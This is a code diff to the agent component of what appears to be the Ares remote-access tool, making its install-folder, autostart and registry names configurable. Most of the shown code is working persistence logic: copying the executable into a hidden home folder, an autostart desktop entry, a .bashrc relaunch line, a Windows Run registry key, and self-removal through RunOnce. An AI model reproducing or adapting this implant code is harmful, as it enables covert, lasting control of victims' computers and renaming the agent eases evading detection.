@@ -1,5 +1,4 @@
 # coding: utf-8
-
 import requests
 import time
 import os
@@ -55,11 +54,11 @@ class Agent(object):
     def get_install_dir(self):
         install_dir = None
         if platform.system() == 'Linux':
-            install_dir = self.expand_path('~/.ares')
+            install_dir = self.expand_path('~/.%s' % config.AGENT_NAME)
         elif platform.system() == 'Windows':
-            install_dir = os.path.join(os.getenv('USERPROFILE'), 'ares')
+            install_dir = os.path.join(os.getenv('USERPROFILE'), config.AGENT_NAME)
         elif platform.system() == "Darwin":
-            install_dir = self.expand_path('~/.ares')
+            install_dir = self.expand_path('~/.%s' % config.AGENT_NAME)
         if os.path.exists(install_dir):
             return install_dir
         else:
@@ -205,46 +204,46 @@ class Agent(object):
             self.send_output('[!] Agent seems to be already installed.')
             return
         if platform.system() == 'Linux':
-            persist_dir = self.expand_path('~/.ares')
+            persist_dir = self.expand_path('~/.%s' % config.AGENT_NAME)
             if not os.path.exists(persist_dir):
                 os.makedirs(persist_dir)
             agent_path = os.path.join(persist_dir, os.path.basename(sys.executable))
             shutil.copyfile(sys.executable, agent_path)
             os.system('chmod +x ' + agent_path)
             if os.path.exists(self.expand_path("~/.config/autostart/")):
-                desktop_entry = "[Desktop Entry]\nVersion=1.0\nType=Application\nName=Ares\nExec=%s\n" % agent_path
-                with open(self.expand_path('~/.config/autostart/ares.desktop'), 'w') as f:
+                desktop_entry = "[Desktop Entry]\nVersion=1.0\nType=Application\nName=%s\nExec=%s\n" % (config.AGENT_NAME, agent_path)
+                with open(self.expand_path('~/.config/autostart/%s.desktop' % config.AGENT_NAME), 'w') as f:
                     f.write(desktop_entry)
             else:
                 with open(self.expand_path("~/.bashrc"), "a") as f:
                     f.write("\n(if [ $(ps aux|grep " + os.path.basename(
                         sys.executable) + "|wc -l) -lt 2 ]; then " + agent_path + ";fi&)\n")
         elif platform.system() == 'Windows':
-            persist_dir = os.path.join(os.getenv('USERPROFILE'), 'ares')
+            persist_dir = os.path.join(os.getenv('USERPROFILE'), config.AGENT_NAME)
             if not os.path.exists(persist_dir):
                 os.makedirs(persist_dir)
             agent_path = os.path.join(persist_dir, os.path.basename(sys.executable))
             shutil.copyfile(sys.executable, agent_path)
-            cmd = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v ares /t REG_SZ /d \"%s\"" % agent_path
+            cmd = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v %s /t REG_SZ /d \"%s\"" % (config.AGENT_NAME, agent_path)
             subprocess.Popen(cmd, shell=True)
         self.send_output('[+] Agent installed.')
 
     def clean(self):
         """ Uninstalls the agent """
         if platform.system() == 'Linux':
-            persist_dir = self.expand_path('~/.ares')
+            persist_dir = self.expand_path('~/.%s' % config.AGENT_NAME)
             if os.path.exists(persist_dir):
                 shutil.rmtree(persist_dir)
-            desktop_entry = self.expand_path('~/.config/autostart/ares.desktop')
+            desktop_entry = self.expand_path('~/.config/autostart/%s.desktop' % config.AGENT_NAME)
             if os.path.exists(desktop_entry):
                 os.remove(desktop_entry)
-            os.system("grep -v .ares .bashrc > .bashrc.tmp;mv .bashrc.tmp .bashrc")
+            os.system("grep -v .%s .bashrc > .bashrc.tmp;mv .bashrc.tmp .bashrc" % config.AGENT_NAME)
         elif platform.system() == 'Windows':
-            persist_dir = os.path.join(os.getenv('USERPROFILE'), 'ares')
-            cmd = "reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v ares"
+            persist_dir = os.path.join(os.getenv('USERPROFILE'), config.AGENT_NAME)
+            cmd = "reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v %s" % config.AGENT_NAME
             subprocess.Popen(cmd, shell=True)
-            cmd = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /f /v ares /t REG_SZ /d \"cmd.exe /c del /s /q %s & rmdir %s\"" % (
-            persist_dir, persist_dir)
+            cmd = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /f /v %s /t REG_SZ /d \"cmd.exe /c del /s /q %s & rmdir %s\"" % (
+            config.AGENT_NAME, persist_dir, persist_dir)
             subprocess.Popen(cmd, shell=True)
         self.send_output('[+] Agent removed successfully.')
 
